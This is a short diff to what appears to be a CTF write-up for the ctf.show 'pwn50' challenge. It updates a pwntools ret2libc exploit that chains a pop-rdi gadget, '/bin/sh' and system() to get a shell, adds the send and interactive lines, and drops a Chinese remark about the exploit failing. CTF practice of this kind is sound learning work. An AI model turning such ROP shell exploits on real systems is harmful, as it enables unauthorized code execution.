@@ -98,7 +98,7 @@ tasike@tasike-VM:~/Desktop$ ROPgadget --binary pwn50 --only "pop|ret" | grep ret
 from pwn import *
 from LibcSearcher import *
 context(os = 'Linux', arch = 'amd64', log_level = 'debug')
-r = remote('pwn.challenge.ctf.show', 28209)
+r = remote('pwn.challenge.ctf.show', 28194)
 
 elf = ELF('./pwn50')
 poprdi = 0x4007e3
@@ -116,6 +116,7 @@ system = libc_base + libc.dump('system')
 binsh = libc_base + libc.dump('str_bin_sh')
 ret = 0x4004fe
 payload = cyclic(0x20 + 0x8) + p64(poprdi) + p64(binsh) + p64(ret) + p64(system) 
+r.sendline(payload)
+r.interactive()
 ```
 
-不知道为啥没有打通，就libc连不上？
